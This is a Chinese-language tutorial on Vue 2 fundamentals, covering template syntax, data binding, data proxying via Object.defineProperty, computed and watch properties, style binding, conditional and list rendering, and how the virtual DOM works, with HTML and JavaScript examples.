#1. Vue基础知识和原理

## 1.1 初识Vue

* 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象
* demo容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法
* demo容器里的代码被称为【Vue模板】
* Vue实例和容器是一一对应的
* 真实开发中只有一个Vue实例，并且会配合着组件一起使用
* {{xxx}}是Vue的语法：插值表达式，{{xxx}}可以读取到data中的所有属性
* 一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新(Vue实现的响应式)



> 初始示例代码

```html
<!-- 准备好一个容器 -->
<div id="demo">
	<h1>Hello，{{name.toUpperCase()}}，{{address}}</h1>
</div>

<script type="text/javascript" >
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	//创建Vue实例
	new Vue({
		el:'#demo', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。
		data:{ //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
			name:'hello,world',
			address:'北京'
		}
	});
</script>
```



## 1.2 模板语法

Vue模板语法有2大类:

* 插值语法：

  功能：用于解析标签体内容

  写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性

* 指令语法:

  功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）

  举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，且可以直接读取到data中的所有属性

  

> 代码

```html
<div id="root">
	<h1>插值语法</h1>
	<h3>你好，{{name}}</h3>
	<hr/>
	<h1>指令语法</h1>
    <!-- 这里是展示被Vue指令绑定的属性，引号内写的是js表达式 -->
	<a :href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a>
	<a :href="school.url" x="hello">点我去{{school.name}}学习2</a>
</div>

<script>
    new Vue({
		el:'#root',
		data:{
			name:'jack',
			school:{
				name:'百度',
				url:'http://www.baidu.com',
			}
        }
	})
</script>
```





## 1.3 数据绑定

Vue中有2种数据绑定的方式：

* 单向绑定(v-bind)：数据只能从data流向页面

* 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data

  > tips: 
  >
  > 1.双向绑定一般都应用在表单类元素上（如：input、select等）
  >
  > 2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值



> 代码

```html
<div id="root">
	<!-- 普通写法 单向数据绑定 -->
    单向数据绑定：<input type="text" v-bind:value="name"><br/>
    双向数据绑定：<input type="text" v-model:value="name"><br/>
    
    <!-- 简写 v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值-->
    单向数据绑定：<input type="text" :value="name"><br/>
    双向数据绑定：<input type="text" v-model="name"><br/>
</div>

<script>
    new Vue({
		el:'#root',
		data:{
			name:'jack',
        }
	})
</script>
```





## 1.4 el与data的两种写法

el有2种写法

* new Vue时候配置el属性

* 先创建Vue实例，随后再通过vm.$mount('#root')指定el的值

> 代码

```html
<script>
   	// 第一种 
	const vm = new Vue({
		el:'#root',
		data:{
			name:'jack',
        }
	})
    
    // 第二种
    vm.$mount('#root')
</script>
```



data有2种写法

* 对象式

* 函数式

  > 在组件中，data必须使用函数式



> 代码

```html
<script>
    new Vue({
		el:'#root',
        // 第一种
		data:{
			name:'jack',
        }
        
        // 第二种
        data() {
        	return {
                name: 'jack'
            }
    	}
	})
</script>
```





## 1.5 Vue中的MVVM

* M：模型(Model) ：data中的数据
* V：视图(View) ：模板代码
* VM：视图模型(ViewModel)：Vue实例





## 1.6 数据代理

> 了解数据代理需要js的一些知识：Object.defineProperty()，属性标志，属性描述符，getter，setter。。。

建议学习文章地址：

https://zh.javascript.info/property-descriptors

https://zh.javascript.info/property-accessors

这里简单介绍一下：

**属性标志**:

对象属性（properties），除 **`value`** 外，还有三个特殊的特性（attributes），也就是所谓的“标志”

* **`writable`** — 如果为 `true`，则值可以被修改，否则它是只可读的
* **`enumerable`** — 如果为 `true`，则表示是可以遍历的，可以在for.. .in   Object.keys()中遍历出来
* **`configurable`** — 如果为 `true`，则此属性可以被删除，这些特性也可以被修改，否则不可以



**Object.getOwnPropertyDescriptor(obj, propertyName)**

> 这个方法是查询有关属性的完整信息 obj是对象， propertyName是属性名

```js
let user = {
  name: "John"
};

let descriptor = Object.getOwnPropertyDescriptor(user, 'name');


console.log(descriptor)

/* 属性描述符：
{
  "value": "John",
  "writable": true,
  "enumerable": true,
  "configurable": true
}
*/
```

> 打印结果

![在这里插入图片描述](https://img-blog.csdnimg.cn/09b4bf67bb7843388fecd7da1572901f.png)






**Object.defineProperty**(obj, prop, descriptor)

> obj：要定义属性的对象。
>
> prop：要定义或修改的属性的名称
>
> descriptor：要定义或修改的属性描述符

```js
let user = {
  name: "John"
};

Object.defineProperty(user, "name", {
  writable: false
});

user.name = "Pete";

// 打印后还是显示 'John',无法修改name值
```



其他的属性标志就不演示了，接下来看重点：访问器属性。

**访问器属性：**

本质上是用于获取和设置值的函数，但从外部代码来看就像常规属性。

访问器属性由 “getter” 和 “setter” 方法表示。在对象字面量中，它们用 `get` 和 `set` 表示：

```js
let obj = {
    get name() {
        // 当读取 obj.propName 时，getter 起作用
    },
    set name() {
        // 当执行 obj.name = value 操作时，setter 起作用
    }
}
```

**更复杂一点的使用**

```js
let user = {
	surname: 'gao',
    name: 'han'
    
    get fullName() {
        return this.name + this.surname;
    }
}

console.log(user.fullName)
```

从外表看，访问器属性看起来就像一个普通属性。这就是访问器属性的设计思想。我们不以函数的方式 **调用** `user.fullName`，我们正常 **读取** 它：getter 在幕后运行。

> vue的计算属性的底层构造感觉用到了这种思想，我目前还没看过源码，是这样猜想的。

截至目前，`fullName` 只有一个 getter。如果我们尝试赋值操作 `user.fullName=`，将会出现错误：

```js
user.fullName = "Test"; // Error（属性只有一个 getter）
```

为 `user.fullName` 添加一个 setter 来修复它：

```js
let user = {
	surname: 'gao',
    name: 'han'
    
    get fullName() {
        return this.name + ' ' + this.surname;
    }

	set fullName(value) {
        // 这个用到了新语法 结构赋值
        [this.surname, this.name] = value.split(' ');
    }
}

user.fullName = 'Li Hua'

console.log(user.name);
console.log(user.surname);
```



**终于可以介绍数据代理了**：

数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）

先来看个案例：

```js
let obj = {
    x: 100
}

let obj2 = {
    y: 200
}
```

这时候提一个需求：我们想要访问 **obj** 中的 **x** 的值，但我们最好不要直接去访问 **obj** ,而是想要通过 **obj2** 这个代理对象去访问。

这时候就可以用上 **Object.defineProperty()**，给 **obj2** 添加上访问器属性（也就是getter和setter）

> 代码

```js
let obj = {
    x: 100
}

let obj2 = {
    y: 200
}

Object.defineProperty(obj2, 'x', {
    get() {
        return obj.x;
    },
    set(value) {
        obj.x = value;
    }
})
```

> 这就是数据代理，也不难吧



**接下来介绍Vue中的数据代理**

* Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）
* Vue中数据代理的好处：更加方便的操作data中的数据
* 基本原理：
  * 通过Object.defineProperty()把data对象中所有属性添加到vm上。
  * 为每一个添加到vm上的属性，都指定一个getter/setter。
  * 在getter/setter内部去操作（读/写）data中对应的属性。



我来用一个案例来详细解释这一个过程。

```html
<!-- 准备好一个容器-->
<div id="root">
	<h2>学校名称：{{name}}</h2>
	<h2>学校地址：{{address}}</h2>
</div>

<script>
	const vm = new Vue({
        el: '#root',
        data: {
            name: '浙江师范大学',
            address: '浙江金华'
        }
    })
</script>
```

我们在控制台打印 new 出来的 vm

![在这里插入图片描述](https://img-blog.csdnimg.cn/ea14682958924e37bf950f3960ee998e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


可以看到，写在配置项中的 data 数据被 绑定到了 vm 对象上，我先来讲结果，是 Vue 将 _data 中的 name，address 数据 代理到 vm 本身上。

> 一脸懵逼？

先来解释下_data 是啥， _data 就是 vm 身上的 _data 属性，就是下图那个

![在这里插入图片描述](https://img-blog.csdnimg.cn/bc4efbf50f414b1a9c1db2ff3581d228.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


这个 _data 是从哪来的？

```html
<script>
    
	const vm = new Vue({
        el: '#root',
        // 我们在Vue 初始化的配置项中写了 data 属性。
        data: {
            name: '浙江师范大学',
            address: '浙江金华'
        }
    })
</script>
```

new Vue 时， Vue 通过一系列处理， 将匹配项上的 data 数据绑定到了 _data 这个属性上，并对这个属性进行了处理（数据劫持），但这个属性就是来源于配置项中的 data，我们可以来验证一下。

```html
<script>
    
    let data1 = {
        name: '浙江师范大学',
        address: '浙江金华'
    }
    
	const vm = new Vue({
        el: '#root',
        // 我们在Vue 初始化的配置项中写了 data 属性。
        data: data1
    })
</script>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/e0051173ac224b408d037fda33de6410.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_18,color_FFFFFF,t_70,g_se,x_16)


> 打印结果为true，说明两者就是同一个



好了，再回到数据代理上来，将 **vm._data** 中的值，再代理到 vm 本身上来，用vm.name 代替 **vm._data.name**。这就是 Vue 的数据代理

![在这里插入图片描述](https://img-blog.csdnimg.cn/66b4020fbc5143aa8ddf3f6fd86af0ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_19,color_FFFFFF,t_70,g_se,x_16)


这一切都是通过 Object.defineProperty() 来完成的，我来模拟一下这个过程

```js
Object.defineProperty(vm, 'name', {
    get() {
        return vm._data.name;
    },
    set(value) {
        vm._data.name = value
    }
})
```

> 这样有啥意义？明明通过 vm._data.name 也可以访问 name 的值，为啥费力去这样操作？

在插值语法中，{{ name }} 取到的值就相当于 {{ vm.name }}，不用数据代理的话，在插值语法就要这样去写了。

{{ _data. name }} 这不符合直觉，怪怪的。vue 这样设计更利于开发者开发，我们在研究原理会觉得有些复杂（笑~）

来个尚硅谷张天禹老师做的图（非常推荐去看他的课，讲的非常好）

![在这里插入图片描述](https://img-blog.csdnimg.cn/8ccad88c5e40497587dadb3db07e1821.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)






## 1.7 事件处理

事件的基本使用：

* 使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名
* 事件的回调需要配置在methods对象中，最终会在vm上
* methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象



```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>欢迎来到{{name}}学习</h2>
    <!-- <button v-on:click="showInfo">点我提示信息</button> -->
    <button @click="showInfo1">点我提示信息1（不传参）</button>
    <!-- 主动传事件本身 -->
    <button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            name:'vue',
        },
        methods:{
            // 如果vue模板没有写event，会自动传 event 给函数
            showInfo1(event){
                // console.log(event.target.innerText)
                // console.log(this) //此处的this是vm
                alert('同学你好！')
            },
            showInfo2(event,number){
                console.log(event,number)
                // console.log(event.target.innerText)
                // console.log(this) //此处的this是vm
                alert('同学你好！！')
            }
        }
	});
</script>
```



**Vue中的事件修饰符**

* prevent：阻止默认事件（常用）
* stop：阻止事件冒泡（常用）
* once：事件只触发一次（常用）



```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>欢迎来到{{name}}学习</h2>
    <!-- 阻止默认事件（常用） -->
	<a href="http://www.baidu.com" @click.prevent="showInfo">点我提示信息</a>
    <!-- 阻止事件冒泡（常用） -->
    <div class="demo1" @click="showInfo">
        <button @click.stop="showInfo">点我提示信息</button>
        <!-- 修饰符可以连续写 -->
        <!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
    </div>
    <!-- 事件只触发一次（常用） -->
    <button @click.once="showInfo">点我提示信息</button>
</div>

```





## 1.8 键盘事件

键盘事件语法糖：@keydown，@keyup

Vue中常用的按键别名：

* 回车 => enter
* 删除 => delete
* 退出 => esc
* 空格 => space
* 换行 => tab (特殊，必须配合keydown去使用)



```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>欢迎来到{{name}}学习</h2>
    <input type="text" placeholder="按下回车提示输入" @keydown.enter="showInfo">
</div>

<script>
    new Vue({
        el:'#root',
        data:{
            name:'浙江理工大学'
        },
        methods: {
            showInfo(e){
                // console.log(e.key,e.keyCode)
                console.log(e.target.value)
            }
        },
    })
</script>
```





## 1.9 计算属性

* 定义：要用的属性不存在，要通过已有属性计算得来
* 原理：底层借助了Objcet.defineProperty方法提供的getter和setter
* get函数什么时候执行？
  * (1).初次读取时会执行一次
  * (2).当依赖的数据发生改变时会被再次调用
* 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便
* 备注：
  * 计算属性最终会出现在vm上，直接读取使用即可
  * 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变



> 计算属性完整版写法

```html
<!-- 准备好一个容器-->
<div id="root">
    姓：<input type="text" v-model="firstName">
    名：<input type="text" v-model="lastName"> 
    全名：<span>{{fullName}}</span>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            firstName:'张',
            lastName:'三',
        }
        computed:{
            fullName:{
                //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
                //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
                get(){
                    console.log('get被调用了')
                    return this.firstName + '-' + this.lastName
                },
                //set什么时候调用? 当fullName被修改时。
                // 可以主动在控制台修改fullName来查看情况
                set(value){
                    console.log('set',value)
                    const arr = value.split('-')
                    this.firstName = arr[0]
                    this.lastName = arr[1]
                }
            }
        }
    })
</script>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/0acfc64ee54d44418ff0a2750a6c4ffd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_17,color_FFFFFF,t_70,g_se,x_16)


> 计算属性简写

```html
<!-- 准备好一个容器-->
<div id="root">
    姓：<input type="text" v-model="firstName">
    名：<input type="text" v-model="lastName"> 
    全名：<span>{{fullName}}</span>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            firstName:'张',
            lastName:'三',
        }
        computed:{
            fullName() {
        		console.log('get被调用了')
				return this.firstName + '-' + this.lastName
    		}
        }
    })
</script>
```





## 1.10 监视属性

监视属性watch：

* 当被监视的属性变化时, 回调函数自动调用, 进行相关操作
* 监视的属性必须存在，才能进行监视
* 监视的两种写法：
  * (1).new Vue时传入watch配置
  * (2).通过vm.$watch监视



> 第一种写法

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>今天天气很{{ info }}</h2>
    <button @click="changeWeather">切换天气</button>
</div>


<script>
	const vm = new Vue({
        el:'#root',
        data:{
            isHot:true,
        },
        computed:{
            info(){
                return this.isHot ? '炎热' : '凉爽'
            }
        },
        methods: {
            changeWeather(){
                this.isHot = !this.isHot
            }
        },
        watch:{
            isHot:{
                immediate: true, // 初始化时让handler调用一下
                // handler什么时候调用？当isHot发生改变时。
                handler(newValue, oldValue){
                    console.log('isHot被修改了',newValue,oldValue)
                }
            }
        } 
    })
</script>
```

> 第二种写法

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>今天天气很{{ info }}</h2>
    <button @click="changeWeather">切换天气</button>
</div>


<script>
	const vm = new Vue({
        el:'#root',
        data:{
            isHot:true,
        },
        computed:{
            info(){
                return this.isHot ? '炎热' : '凉爽'
            }
        },
        methods: {
            changeWeather(){
                this.isHot = !this.isHot
            }
        }
    })
    
    vm.$watch('isHot',{
        immediate:true, //初始化时让handler调用一下
        //handler什么时候调用？当isHot发生改变时。
        handler(newValue,oldValue){
            console.log('isHot被修改了',newValue,oldValue)
        }
    })
</script>
```



**深度监视：**

* (1).Vue中的watch默认不监测对象内部值的改变（一层）
* (2).配置deep:true可以监测对象内部值改变（多层）



> 备注：
>
> (1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以
>
> (2).使用watch时根据数据的具体结构，决定是否采用深度监视



```html
<!-- 准备好一个容器-->
<div id="root">
    {{numbers.c.d.e}}
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    const vm = new Vue({
        el:'#root',
        data:{
            numbers:{
                c:{
                    d:{
                        e:100
                    }
                }
            }
        },
        watch:{
            //监视多级结构中某个属性的变化
            /* 'numbers.a':{
					handler(){
						console.log('a被改变了')
					}
				} */
            //监视多级结构中所有属性的变化
            numbers:{
                deep:true,
                handler(){
                    console.log('numbers改变了')
                }
            }
        }
    });
</script>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/b5a0d88990404a5e90bea2788788ec39.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_14,color_FFFFFF,t_70,g_se,x_16)




> 监视属性简写



```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>今天天气很{{info}}</h2>
    <button @click="changeWeather">切换天气</button>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            isHot:true,
        },
        computed:{
            info(){
                return this.isHot ? '炎热' : '凉爽'
            }
        },
        methods: {
            changeWeather(){
                this.isHot = !this.isHot
            }
        },
        watch:{
            //简写
            isHot(newValue, oldValue) {
					console.log('isHot被修改了', newValue, oldValue, this)
			} 
        }
    })
</script>
```



**computed和watch之间的区别：**

* computed能完成的功能，watch都可以完成
* watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作

> 两个重要的小原则：
>
> 1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象
>
> 2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象



```html
<!-- 准备好一个容器-->
<div id="root">
    姓：<input type="text" v-model="firstName"> <br/><br/>
    名：<input type="text" v-model="lastName"> <br/><br/>
    全名：<span>{{fullName}}</span> <br/><br/>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            firstName:'张',
            lastName:'三',
            fullName:'张-三'
        },
        watch:{
            // watch 监视器里可以写 异步函数
            firstName(val){
                setTimeout(()=>{
                    console.log(this)
                    this.fullName = val + '-' + this.lastName
                },1000);
            },
            lastName(val){
                this.fullName = this.firstName + '-' + val
            }
        }
    })
</script>
```





## 1.11 绑定样式

### **class样式**

写法：:class="xxx"    xxx可以是字符串、对象、数。

所以分为三种写法，字符串写法，数组写法，对象写法



**字符串写法**

字符串写法适用于：类名不确定，要动态获取。

```html
<style>
	.normal{
        background-color: skyblue;
    }
</style>

<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
    <div class="basic" :class="mood" @click="changeMood">{{name}}</div>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            mood:'normal'
        }
    })
</script>
```





**数组写法**

数组写法适用于：要绑定多个样式，个数不确定，名字也不确定。

```html
<style>
    .atguigu1{
        background-color: yellowgreen;
    }
    .atguigu2{
        font-size: 30px;
        text-shadow:2px 2px 10px red;
    }
    .atguigu3{
        border-radius: 20px;
    }
</style>

<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
	<div class="basic" :class="classArr">{{name}}</div>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            classArr: ['atguigu1','atguigu2','atguigu3']
        }
    })
</script>
```





**对象写法**

对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。

```html
<style>
    .atguigu1{
        background-color: yellowgreen;
    }
    .atguigu2{
        font-size: 30px;
        text-shadow:2px 2px 10px red;
    }
</style>

<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
	<div class="basic" :class="classObj">{{name}}</div>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            classObj:{
                atguigu1:false,
                atguigu2:false,
			}
        }
    })
</script>
```



### **style样式**

有两种写法，对象写法，数组写法

**对象写法**

```html
<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定style样式--对象写法 -->
	<div class="basic" :style="styleObj">{{name}}</div>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            styleObj:{
                fontSize: '40px',
                color:'red',
			}
        }
    })
</script>
```



**数组写法**

```html
<!-- 准备好一个容器-->
<div id="root">
    <!-- 绑定style样式--数组写法 -->
	<div class="basic" :style="styleArr">{{name}}</div>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            styleArr:[
                {
                    fontSize: '40px',
                    color:'blue',
                },
                {
                    backgroundColor:'gray'
                }
            ]
        }
    })
</script>
```





## 1.12 条件渲染

### v-if

* 写法：

  (1).v-if="表达式" 

  (2).v-else-if="表达式"

  (3).v-else="表达式"

* 适用于：切换频率较低的场景

* 特点：不展示的DOM元素直接被移除

* 注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”



```html
<!-- 准备好一个容器-->
<div id="root">
    <!-- 使用v-if做条件渲染 -->
    <h2 v-if="false">欢迎来到{{name}}</h2>
    <h2 v-if="1 === 1">欢迎来到{{name}}</h2>
    
    
    <!-- v-else和v-else-if -->
    <div v-if="n === 1">Angular</div>
    <div v-else-if="n === 2">React</div>
    <div v-else-if="n === 3">Vue</div>
    <div v-else>哈哈</div>
    
    
    <!-- v-if与template的配合使用 -->
    <!-- 就不需要写好多个判断，写一个就行 -->
    <!-- 这里的思想就像事件代理的使用 -->
    <template v-if="n === 1">
        <h2>你好</h2>
        <h2>尚硅谷</h2>
        <h2>北京</h2>
    </template>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data:{
            styleArr:[
                {
                    fontSize: '40px',
                    color:'blue',
                },
                {
                    backgroundColor:'gray'
                }
            ]
        }
    })
</script>
```



### **v-show**

* 写法：v-show="表达式"
* 适用于：切换频率较高的场景
* 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉(display:none)



> 备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到
>
> v-if 是实打实地改变dom元素，v-show 是隐藏或显示dom元素

```html
<!-- 准备好一个容器-->
<div id="root">
    <!-- 使用v-show做条件渲染 -->
    <h2 v-show="false">欢迎来到{{name}}</h2>
    <h2 v-show="1 === 1">欢迎来到{{name}}</h2>
</div>
```





## 1.13 列表渲染

### v-for指令

* 用于展示列表数据
* 语法：v-for="(item, index) in xxx" :key="yyy"
* 可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）



```html
<div id="root">
    <!-- 遍历数组 -->
    <h2>人员列表（遍历数组）</h2>
    <ul>
        <li v-for="(p,index) of persons" :key="index">
            {{p.name}}-{{p.age}}
        </li>
    </ul>

    <!-- 遍历对象 -->
    <h2>汽车信息（遍历对象）</h2>
    <ul>
        <li v-for="(value,k) of car" :key="k">
            {{k}}-{{value}}
        </li>
    </ul>

    <!-- 遍历字符串 -->
    <h2>测试遍历字符串（用得少）</h2>
    <ul>
        <li v-for="(char,index) of str" :key="index">
            {{char}}-{{index}}
        </li>
    </ul>

    <!-- 遍历指定次数 -->
    <h2>测试遍历指定次数（用得少）</h2>
    <ul>
        <li v-for="(number,index) of 5" :key="index">
            {{index}}-{{number}}
        </li>
    </ul>
</div>

<script>
	const vm = new Vue({
        el:'#root',
        data: {
			persons: [
				{ id: '001', name: '张三', age: 18 },
				{ id: '002', name: '李四', age: 19 },
				{ id: '003', name: '王五', age: 20 }
			],
			car: {
				name: '奥迪A8',
				price: '70万',
				color: '黑色'
			},
			str: 'hello'
		}
    })
</script>
```



### **key的原理**

vue中的key有什么作用？（key的内部原理）

了解vue中key的原理需要一些前置知识。

就是vue的虚拟dom，vue会根据 data中的数据生成虚拟dom，如果是第一次生成页面，就将虚拟dom转成真实dom，在页面展示出来。

虚拟dom有啥用？每次vm._data 中的数据更改，都会触发生成新的虚拟dom，新的虚拟dom会跟旧的虚拟dom进行比较，如果有相同的，在生成真实dom时，这部分相同的就不需要重新生成，只需要将两者之间不同的dom转换成真实dom，再与原来的真实dom进行拼接。我的理解是虚拟dom就是起到了一个dom复用的作用，还有避免重复多余的操作，下文有详细解释。



而key有啥用？

key是虚拟dom的标识。



先来点预备的知识：啥是真实 DOM？真实 DOM 和 虚拟 DOM 有啥区别？如何用代码展现真实 DOM 和 虚拟 DOM

#### 真实`DOM`和其解析流程

这里参考超级英雄大佬：https://juejin.cn/post/6844903895467032589

`webkit` 渲染引擎工作流程图

![img](https://img-blog.csdnimg.cn/img_convert/b32d88931ee775d57b382d7585de3ad8.png)

> 中文版

![img](https://img-blog.csdnimg.cn/img_convert/cd1757feee540ef20c50b81af16d75ca.png)



 所有的浏览器渲染引擎工作流程大致分为5步：创建 `DOM` 树 —> 创建 `Style Rules` -> 构建 `Render` 树 —> 布局 `Layout` -—> 绘制 `Painting`。

* 第一步，构建 DOM 树：当浏览器接收到来自服务器响应的HTML文档后，会遍历文档节点，生成DOM树。需要注意的是在DOM树生成的过程中有可能会被CSS和JS的加载执行阻塞，渲染阻塞下面会讲到。

* 第二步，生成样式表：用 CSS 分析器，分析 CSS 文件和元素上的 inline 样式，生成页面的样式表；

* 渲染阻塞：当浏览器遇到一个script标签时，DOM构建将暂停，直到脚本加载执行，然后继续构建DOM树。每次去执行Javascript脚本都会严重阻塞DOM树构建，如果JavaScript脚本还操作了CSSOM，而正好这个CSSOM没有下载和构建，那么浏览器甚至会延迟脚本执行和构建DOM，直到这个CSSOM的下载和构建。所以，script标签引入很重要，实际使用时可以遵循下面两个原则：

  * css优先：引入顺序上，css资源先于js资源

  * js后置：js代码放在底部，且js应尽量少影响DOM构建

    > 还有一个小知识：当解析html时，会把新来的元素插入dom树里，同时去查找css，然后把对应的样式规则应用到元素上，查找样式表是按照从右到左的顺序匹配的例如：div p {...}，会先寻找所有p标签并判断它的父标签是否为div之后才决定要不要采用这个样式渲染。所以平时写css尽量用class或者id，不要过度层叠

* 第三步，构建渲染树：通过DOM树和CSS规则我们可以构建渲染树。浏览器会从DOM树根节点开始遍历每个可见节点(注意是可见节点)对每个可见节点，找到其适配的CSS规则并应用。渲染树构建完后，每个节点都是可见节点并且都含有其内容和对应的规则的样式。这也是渲染树和DOM树最大的区别所在。渲染是用于显示，那些不可见的元素就不会在这棵树出现了。除此以外，display none的元素也不会被显示在这棵树里。visibility hidden的元素会出现在这棵树里。

* 第四步，**渲染布局**：布局阶段会从渲染树的根节点开始遍历，然后确定每个节点对象在页面上的确切大小与位置，布局阶段的输出是一个盒子模型，它会精确地捕获每个元素在屏幕内的确切位置与大小。

* 第五步，**渲染树绘制**：在绘制阶段，遍历渲染树，调用渲染器的paint()方法在屏幕上显示其内容。渲染树的绘制工作是由浏览器的UI后端组件完成的。

**注意点：**

**1、`DOM` 树的构建是文档加载完成开始的？** 构建 `DOM` 树是一个渐进过程，为达到更好的用户体验，渲染引擎会尽快将内容显示在屏幕上，它不必等到整个 `HTML` 文档解析完成之后才开始构建 `render` 树和布局。

**2、`Render` 树是 `DOM` 树和 `CSS` 样式表构建完毕后才开始构建的？** 这三个过程在实际进行的时候并不是完全独立的，而是会有交叉，会一边加载，一边解析，以及一边渲染。

**3、`CSS` 的解析注意点？** `CSS` 的解析是从右往左逆向解析的，嵌套标签越多，解析越慢。

**4、`JS` 操作真实 `DOM` 的代价？**传统DOM结构操作方式对性能的影响很大，原因是频繁操作DOM结构操作会引起页面的重排(reflow)和重绘(repaint)，浏览器不得不频繁地计算布局，重新排列和绘制页面元素，导致浏览器产生巨大的性能开销。直接操作真实`DOM`的性能特别差，我们可以来演示一遍。

```js
<div id="app"></div>
<script>
    // 获取 DIV 元素
    let box = document.querySelector('#app');
    console.log(box);

    // 真实 DOM 操作
    console.time('a');
    for (let i = 0; i <= 10000; i++) {
        box.innerHTML = i;
    }
    console.timeEnd('a');

    // 虚拟 DOM 操作
    let num = 0;
    console.time('b');
    for (let i = 0; i <= 10000; i++) {
        num = i;
    }
    box.innerHTML = num;
    console.timeEnd('b');

</script>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/0740cb16f1354358bed6ef638b90ebfe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_19,color_FFFFFF,t_70,g_se,x_16)


>从结果中可以看出，操作真实 DOM 的性能是非常差的，所以我们要尽可能的复用，减少 DOM 操作。





#### **虚拟 DOM 的好处**

	虚拟 `DOM` 就是为了解决浏览器性能问题而被设计出来的。如前，若一次操作中有 10 次更新 `DOM` 的动作，虚拟 `DOM` 不会立即操作 `DOM`，而是将这 10 次更新的 `diff` 内容保存到本地一个 `JS` 对象中，最终将这个 `JS` 对象一次性 `attch` 到 `DOM` 树上，再进行后续操作，避免大量无谓的计算量。所以，用 `JS` 对象模拟 `DOM` 节点的好处是，页面的更新可以先全部反映在 `JS` 对象(虚拟 `DOM` )上，操作内存中的 `JS` 对象的速度显然要更快，等更新完成后，再将最终的 `JS` 对象映射成真实的 `DOM`，交由浏览器去绘制。
	
	虽然这一个虚拟 DOM 带来的一个优势，但并不是全部。虚拟 DOM 最大的优势在于抽象了原本的渲染过程，实现了跨平台的能力，而不仅仅局限于浏览器的 DOM，可以是安卓和 IOS 的原生组件，可以是近期很火热的小程序，也可以是各种GUI。
	
	回到最开始的问题，虚拟 DOM 到底是什么，说简单点，就是一个普通的 JavaScript 对象，包含了 `tag`、`props`、`children` 三个属性。

